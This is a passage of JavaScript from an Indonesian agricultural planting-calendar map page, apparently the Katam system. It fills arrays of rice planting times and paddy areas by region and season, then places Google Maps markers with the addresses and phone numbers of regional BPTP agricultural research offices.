            MK2_waktu_tanam_padi_sawah['2,0'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,0'] = '0';
            MK2_waktu_tanam_padi_sawah['2,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['2,1'] = '-';
            MK2_waktu_tanam_padi_sawah['2,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['2,2'] = '-';
            MK2_waktu_tanam_padi_sawah['2,1'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,1'] = '0';
            MK2_waktu_tanam_padi_sawah['2,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['2,2'] = '-';
            MK2_waktu_tanam_padi_sawah['2,2'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,2'] = '0';
            MK2_waktu_tanam_padi_sawah['2,3'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,3'] = '0';
            MK2_waktu_tanam_padi_sawah['2,4'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,4'] = '0';
            MK2_waktu_tanam_padi_sawah['2,5'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,5'] = '0';
            MK2_waktu_tanam_padi_sawah['2,6'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['2,6'] = '0';
            MK2_waktu_tanam_padi_sawah['2,7'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['2,7'] = '0';
            MK2_waktu_tanam_padi_sawah['2,8'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['2,8'] = '0';
            MK1_waktu_tanam_padi_sawah['3,0'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['3,0'] = '133470';
            MK1_waktu_tanam_padi_sawah['3,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['3,1'] = '-';
            MK1_waktu_tanam_padi_sawah['3,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['3,2'] = '-';
            MK1_waktu_tanam_padi_sawah['3,1'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['3,1'] = '77440';
            MK1_waktu_tanam_padi_sawah['3,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['3,2'] = '-';
            MK1_waktu_tanam_padi_sawah['3,2'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['3,2'] = '72197';
            MK1_waktu_tanam_padi_sawah['3,3'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['3,3'] = '67895';
            MK1_waktu_tanam_padi_sawah['3,4'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['3,4'] = '46765';
            MK1_waktu_tanam_padi_sawah['3,5'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['3,5'] = '42730';
            MK1_waktu_tanam_padi_sawah['3,6'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['3,6'] = '7275';
            MK1_waktu_tanam_padi_sawah['3,7'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['3,7'] = '2972';
            MK1_waktu_tanam_padi_sawah['3,8'] = 'JUL III-AGS I';
            MK1_luas_padi_sawah_ha_hitung['3,8'] = '475';
            MK1_waktu_tanam_padi_sawah['3,9'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['3,9'] = '74';
            MK1_waktu_tanam_padi_sawah['3,10'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['3,10'] = '0';
            MK2_waktu_tanam_padi_sawah['3,0'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['3,0'] = '0';
            MK2_waktu_tanam_padi_sawah['3,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['3,1'] = '-';
            MK2_waktu_tanam_padi_sawah['3,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['3,2'] = '-';
            MK2_waktu_tanam_padi_sawah['3,1'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['3,1'] = '0';
            MK2_waktu_tanam_padi_sawah['3,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['3,2'] = '-';
            MK2_waktu_tanam_padi_sawah['3,2'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['3,2'] = '0';
            MK2_waktu_tanam_padi_sawah['3,3'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['3,3'] = '0';
            MK2_waktu_tanam_padi_sawah['3,4'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['3,4'] = '0';
            MK2_waktu_tanam_padi_sawah['3,5'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['3,5'] = '0';
            MK2_waktu_tanam_padi_sawah['3,6'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['3,6'] = '0';
            MK2_waktu_tanam_padi_sawah['3,7'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['3,7'] = '0';
            MK2_waktu_tanam_padi_sawah['3,8'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['3,8'] = '0';
            MK2_waktu_tanam_padi_sawah['3,9'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['3,9'] = '0';
            MK2_waktu_tanam_padi_sawah['3,10'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['3,10'] = '0';
            MK1_waktu_tanam_padi_sawah['4,0'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['4,0'] = '127529';
            MK1_waktu_tanam_padi_sawah['4,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['4,1'] = '-';
            MK1_waktu_tanam_padi_sawah['4,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['4,2'] = '-';
            MK1_waktu_tanam_padi_sawah['4,1'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['4,1'] = '49972';
            MK1_waktu_tanam_padi_sawah['4,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['4,2'] = '-';
            MK1_waktu_tanam_padi_sawah['4,2'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['4,2'] = '44190';
            MK1_waktu_tanam_padi_sawah['4,3'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['4,3'] = '41087';
            MK1_waktu_tanam_padi_sawah['4,4'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['4,4'] = '30943';
            MK1_waktu_tanam_padi_sawah['4,5'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['4,5'] = '21633';
            MK1_waktu_tanam_padi_sawah['4,6'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['4,6'] = '20911';
            MK1_waktu_tanam_padi_sawah['4,7'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['4,7'] = '19980';
            MK1_waktu_tanam_padi_sawah['4,8'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['4,8'] = '15731';
            MK1_waktu_tanam_padi_sawah['4,9'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['4,9'] = '10853';
            MK1_waktu_tanam_padi_sawah['4,10'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['4,10'] = '10611';
            MK1_waktu_tanam_padi_sawah['4,11'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['4,11'] = '10008';
            MK1_waktu_tanam_padi_sawah['4,12'] = 'JUL III-AGS I';
            MK1_luas_padi_sawah_ha_hitung['4,12'] = '9474';
            MK1_waktu_tanam_padi_sawah['4,13'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['4,13'] = '8269';
            MK1_waktu_tanam_padi_sawah['4,14'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['4,14'] = '6693';
            MK1_waktu_tanam_padi_sawah['4,15'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['4,15'] = '5635';
            MK1_waktu_tanam_padi_sawah['4,16'] = 'JUL III-AGS I';
            MK1_luas_padi_sawah_ha_hitung['4,16'] = '3722';
            MK1_waktu_tanam_padi_sawah['4,17'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['4,17'] = '3209';
            MK1_waktu_tanam_padi_sawah['4,18'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['4,18'] = '3151';
            MK1_waktu_tanam_padi_sawah['4,19'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['4,19'] = '940';
            MK1_waktu_tanam_padi_sawah['4,20'] = 'BERA';
            MK1_luas_padi_sawah_ha_hitung['4,20'] = '0';
            MK1_waktu_tanam_padi_sawah['4,21'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['4,21'] = '0';
            MK1_waktu_tanam_padi_sawah['4,22'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['4,22'] = '0';
            MK1_waktu_tanam_padi_sawah['4,23'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['4,23'] = '0';
            MK1_waktu_tanam_padi_sawah['4,24'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['4,24'] = '0';
            MK1_waktu_tanam_padi_sawah['4,25'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['4,25'] = '0';
            MK2_waktu_tanam_padi_sawah['4,0'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['4,0'] = '0';
            MK2_waktu_tanam_padi_sawah['4,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['4,1'] = '-';
            MK2_waktu_tanam_padi_sawah['4,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['4,2'] = '-';
            MK2_waktu_tanam_padi_sawah['4,1'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['4,1'] = '0';
            MK2_waktu_tanam_padi_sawah['4,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['4,2'] = '-';
            MK2_waktu_tanam_padi_sawah['4,2'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['4,2'] = '0';
            MK2_waktu_tanam_padi_sawah['4,3'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['4,3'] = '0';
            MK2_waktu_tanam_padi_sawah['4,4'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['4,4'] = '0';
            MK2_waktu_tanam_padi_sawah['4,5'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['4,5'] = '0';
            MK2_waktu_tanam_padi_sawah['4,6'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,6'] = '0';
            MK2_waktu_tanam_padi_sawah['4,7'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,7'] = '0';
            MK2_waktu_tanam_padi_sawah['4,8'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,8'] = '0';
            MK2_waktu_tanam_padi_sawah['4,9'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,9'] = '0';
            MK2_waktu_tanam_padi_sawah['4,10'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,10'] = '0';
            MK2_waktu_tanam_padi_sawah['4,11'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,11'] = '0';
            MK2_waktu_tanam_padi_sawah['4,12'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['4,12'] = '0';
            MK2_waktu_tanam_padi_sawah['4,13'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['4,13'] = '0';
            MK2_waktu_tanam_padi_sawah['4,14'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['4,14'] = '0';
            MK2_waktu_tanam_padi_sawah['4,15'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['4,15'] = '0';
            MK2_waktu_tanam_padi_sawah['4,16'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['4,16'] = '0';
            MK2_waktu_tanam_padi_sawah['4,17'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['4,17'] = '0';
            MK2_waktu_tanam_padi_sawah['4,18'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['4,18'] = '0';
            MK2_waktu_tanam_padi_sawah['4,19'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,19'] = '0';
            MK2_waktu_tanam_padi_sawah['4,20'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,20'] = '0';
            MK2_waktu_tanam_padi_sawah['4,21'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['4,21'] = '0';
            MK2_waktu_tanam_padi_sawah['4,22'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['4,22'] = '0';
            MK2_waktu_tanam_padi_sawah['4,23'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['4,23'] = '0';
            MK2_waktu_tanam_padi_sawah['4,24'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['4,24'] = '0';
            MK2_waktu_tanam_padi_sawah['4,25'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['4,25'] = '0';
            MK1_waktu_tanam_padi_sawah['5,0'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['5,0'] = '10959';
            MK1_waktu_tanam_padi_sawah['5,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['5,1'] = '-';
            MK1_waktu_tanam_padi_sawah['5,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['5,2'] = '-';
            MK1_waktu_tanam_padi_sawah['5,1'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['5,1'] = '3181';
            MK1_waktu_tanam_padi_sawah['5,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['5,2'] = '-';
            MK1_waktu_tanam_padi_sawah['5,2'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['5,2'] = '2594';
            MK1_waktu_tanam_padi_sawah['5,3'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['5,3'] = '198';
            MK1_waktu_tanam_padi_sawah['5,4'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['5,4'] = '29';
            MK1_waktu_tanam_padi_sawah['5,5'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['5,5'] = '0';
            MK2_waktu_tanam_padi_sawah['5,0'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['5,0'] = '0';
            MK2_waktu_tanam_padi_sawah['5,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['5,1'] = '-';
            MK2_waktu_tanam_padi_sawah['5,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['5,2'] = '-';
            MK2_waktu_tanam_padi_sawah['5,1'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['5,1'] = '0';
            MK2_waktu_tanam_padi_sawah['5,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['5,2'] = '-';
            MK2_waktu_tanam_padi_sawah['5,2'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['5,2'] = '0';
            MK2_waktu_tanam_padi_sawah['5,3'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['5,3'] = '0';
            MK2_waktu_tanam_padi_sawah['5,4'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['5,4'] = '0';
            MK2_waktu_tanam_padi_sawah['5,5'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['5,5'] = '0';
            MK1_waktu_tanam_padi_sawah['6,0'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['6,0'] = '3521';
            MK1_waktu_tanam_padi_sawah['6,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['6,1'] = '-';
            MK1_waktu_tanam_padi_sawah['6,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['6,2'] = '-';
            MK1_waktu_tanam_padi_sawah['6,1'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['6,1'] = '1422';
            MK1_waktu_tanam_padi_sawah['6,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['6,2'] = '-';
            MK1_waktu_tanam_padi_sawah['6,2'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['6,2'] = '208';
            MK1_waktu_tanam_padi_sawah['6,3'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['6,3'] = '11';
            MK1_waktu_tanam_padi_sawah['6,4'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['6,4'] = '0';
            MK1_waktu_tanam_padi_sawah['6,5'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['6,5'] = '0';
            MK2_waktu_tanam_padi_sawah['6,0'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['6,0'] = '0';
            MK2_waktu_tanam_padi_sawah['6,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['6,1'] = '-';
            MK2_waktu_tanam_padi_sawah['6,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['6,2'] = '-';
            MK2_waktu_tanam_padi_sawah['6,1'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['6,1'] = '0';
            MK2_waktu_tanam_padi_sawah['6,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['6,2'] = '-';
            MK2_waktu_tanam_padi_sawah['6,2'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['6,2'] = '0';
            MK2_waktu_tanam_padi_sawah['6,3'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['6,3'] = '0';
            MK2_waktu_tanam_padi_sawah['6,4'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['6,4'] = '0';
            MK2_waktu_tanam_padi_sawah['6,5'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['6,5'] = '0';
            var infoWindow = new google.maps.InfoWindow();
            var markerBounds = new google.maps.LatLngBounds();
            var markerArray = [];

            function makeMarker(options) {
                //var pushPin = new google.maps.Marker({map:map});
                var pushPin = new google.maps.Marker({
                    map: map
                });
                pushPin.setOptions(options);
                google.maps.event.addListener(pushPin, "click", function() {
                    infoWindow.setOptions(options);
                    infoWindow.open(map, pushPin);
                });
                markerBounds.extend(options.position);
                markerArray.push(pushPin);
                return pushPin;
            }
            google.maps.event.addListener(map, "click", function() {
                infoWindow.close();
            });
            var image_bptp = new google.maps.MarkerImage("http://katam.litbang.pertanian.go.id/markers/markers_bptp.png"
                , new google.maps.Size(16.0, 16.0)
                , new google.maps.Point(0, 0)
                , new google.maps.Point(8.0, 8.0)
            );
            var shadow_bptp = new google.maps.MarkerImage("http://katam.litbang.pertanian.go.id/markers/shadow_bptp.png"
                , new google.maps.Size(25.0, 16.0)
                , new google.maps.Point(0, 0)
                , new google.maps.Point(8.0, 8.0)
            );
            makeMarker({
                position: new google.maps.LatLng(5.561238, 95.344658)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Aceh"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Aceh <br> <b>Alamat :</b> Jl. Pang.Nyak Makam No. 27, Kotak Pos 41 Lampineung, Banda Aceh 23125 <br> <b>No Telp/Fax :</b> 0651-7551811/ 0651-7552077 <br> <b>Lokasi :</b> Kota Banda Aceh, PROV. Aceh <br>  <a href='https://maps.google.com/maps?t=h&q=5.561238,95.344658&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(3.541203, 98.677144)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sumut"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sumut <br> <b>Alamat :</b> Jl. Jend. AH. Nasution No. 1B, Po. Box 7 MDGJ, Medan 20143 Sumut <br> <b>No Telp/Fax :</b> 061-7870710, 061-7861781/ 061-7861020 <br> <b>Lokasi :</b> Kab. Nias, PROV. Sumatera Utara <br>  <a href='https://maps.google.com/maps?t=h&q=3.541203,98.677144&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-0.947957, 100.620003)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sumbar"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sumbar <br> <b>Alamat :</b> Jl. Raya Padang Solok, Km, 40 Sukarami, Kotak Pos 34 <br> <b>No Telp/Fax :</b> 0755-31564/ 0755-31564 <br> <b>Lokasi :</b> Kab. Solok, PROV. Sumatera Barat <br>  <a href='https://maps.google.com/maps?t=h&q=-0.947957,100.620003&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(0.645278, 101.584444)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Riau"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Riau <br> <b>Alamat :</b> Jl. Kaharudin Nasution KM. 10, MarPoyan, Pakanbaru, Po. Box 1020, Riau <br> <b>No Telp/Fax :</b> 0761-35641, 0761-674205/ 0761-674206 <br> <b>Lokasi :</b> Kota Pekanbaru, PROV. Riau <br>  <a href='https://maps.google.com/maps?t=h&q=0.645278,101.584444&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-1.631099, 103.609174)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Jambi"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Jambi <br> <b>Alamat :</b> Jl. Samarinda Paal Lima, Kota Baru Jambi, Kotak Pos 118, Jambi 3600 /  Jl.Raya Jambi-Palembang Km 16 Desa Pondok Meja, Kec.Mestong, Kab.Muara Jambi <br> <b>No Telp/Fax :</b> 0741-40174/ 0741-40413, 0741-53525 <br> <b>Lokasi :</b> Kota Jambi, PROV. Jambi <br>  <a href='https://maps.google.com/maps?t=h&q=-1.631099,103.609174&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-2.934083, 104.718583)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Sumsel"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Sumsel <br> <b>Alamat :</b> Jl. Kolonel H. Barlian, Km, 6 Palembang 30153, Po.Box 1265, Sumatera Selatan <br> <b>No Telp/Fax :</b> 0711-410155/ 0711-411845 <br> <b>Lokasi :</b> Kota Palembang, PROV. Sumatera Selatan <br>  <a href='https://maps.google.com/maps?t=h&q=-2.934083,104.718583&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-3.790209, 102.29994)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Bengkulu"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Bengkulu <br> <b>Alamat :</b> Jl. Irian km, 6,5 Kelurahan Semarang, BENGKULU 38119, Indonesia <br> <b>No Telp/Fax :</b> 0736-23030, 0736-345568/ 0736-23030 <br> <b>Lokasi :</b> Kota Bengkulu, PROV. Bengkulu <br>  <a href='https://maps.google.com/maps?t=h&q=-3.790209,102.29994&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-5.36305, 105.22591)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Lampung"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Lampung <br> <b>Alamat :</b> Jl.K.Hj.Z.A Pagar Alam No.IA, Rajabasa Bandar Lampung 35145 <br> <b>No Telp/Fax :</b> 0721-781776, 0721-701328, 0721-708246/ 0721-705273 <br> <b>Lokasi :</b> Kab. Lampung Selatan, PROV. Lampung <br>  <a href='https://maps.google.com/maps?t=h&q=-5.36305,105.22591&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-1.814243, 106.100793)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "LPTP Babel"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> LPTP Babel <br> <b>Alamat :</b> Jl. Mentok Km, 4 Pangkal Pinang 33134 <br> <b>No Telp/Fax :</b> 0717-422585/ 0717-421797 <br> <b>Lokasi :</b> Kab. Belitung Timur, PROV. Kep. Bangka Belitung <br>  <a href='https://maps.google.com/maps?t=h&q=-1.814243,106.100793&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(0.645278, 101.584444)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Kepulauan Riau"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Kepulauan Riau <br> <b>Alamat :</b> Jl. Kaharudin Nasution KM. 10, MarPoyan, Pakanbaru, Po. Box 1020, Riau <br> <b>No Telp/Fax :</b> 0761-35641, 0761-674205/ 0761-674206 <br> <b>Lokasi :</b> Kota Pekanbaru, PROV. Riau <br>  <a href='https://maps.google.com/maps?t=h&q=0.645278,101.584444&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-6.286407, 106.834888)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Jakarta"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Jakarta <br> <b>Alamat :</b> Jl. Ragunan No 30, Pasar Minggu Jakarta, Po. Box 7321/JKSPM <br> <b>No Telp/Fax :</b> 021-78839949, 021-7815020/ 021-7815020 <br> <b>Lokasi :</b> Kota. Jakarta Selatan, PROV. DKI Jakarta <br>  <a href='https://maps.google.com/maps?t=h&q=-6.286407,106.834888&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-6.822285, 107.63142)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Jabar"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Jabar <br> <b>Alamat :</b> Jl. Kayuambon No. 80, Kotak Pos 8495, Lembang, Bandung 40391 <br> <b>No Telp/Fax :</b> 022-2786238/ 022-2789846 <br> <b>Lokasi :</b> Kab. Bandung Barat, PROV. Jawa Barat <br>  <a href='https://maps.google.com/maps?t=h&q=-6.822285,107.63142&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-7.139709, 110.415913)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Jateng"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Jateng <br> <b>Alamat :</b> Bukit Tegalepek, Sidomulyo, Kotak Pos 101, Ungaran 50501 <br> <b>No Telp/Fax :</b> 024-6924965, 024-6924967/ 024-6924966 <br> <b>Lokasi :</b> Kab. Semarang, PROV. Jawa Tengah <br>  <a href='https://maps.google.com/maps?t=h&q=-7.139709,110.415913&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-7.7513061, 110.4258575)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP DIY"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP DIY <br> <b>Alamat :</b> Ringroad Utara, Karangsari, Sleman, KotakPos 1013, Yogya, 55010, Demanggu Baru <br> <b>No Telp/Fax :</b> 0274-884662, 0274-514959, 0274-566823/ 0274-562935 <br> <b>Lokasi :</b> Kab. Sleman, PROV. DI Yogyakarta <br>  <a href='https://maps.google.com/maps?t=h&q=-7.7513061,110.4258575&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-7.912533, 112.623784)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Jatim"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Jatim <br> <b>Alamat :</b> Jl. Karangploso km, 4, Kotak Pos. 188, Malang 65101, Jatim <br> <b>No Telp/Fax :</b> 0341-494052, 0341-485056/ 0341-471255 <br> <b>Lokasi :</b> Kota Malang, PROV. Jawa Timur <br>  <a href='https://maps.google.com/maps?t=h&q=-7.912533,112.623784&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
                position: new google.maps.LatLng(-6.126047, 106.222658)
                , icon: image_bptp
                , shadow: shadow_bptp
                , title: "BPTP Banten"
                , content: "<div id='infoWindowAdmin_bptp'><b>Nama BPTP :</b> BPTP Banten <br> <b>Alamat :</b> Jl. Raya Ciptayasa Km, 01, Ciruas 42182, Serang <br> <b>No Telp/Fax :</b> 0254-281055/ 0254-282507 <br> <b>Lokasi :</b> Kab. Serang, PROV. Banten <br>  <a href='https://maps.google.com/maps?t=h&q=-6.126047,106.222658&hl=id&z=18' target='_blank'>Buka Peta</a></div>"
            });
            makeMarker({
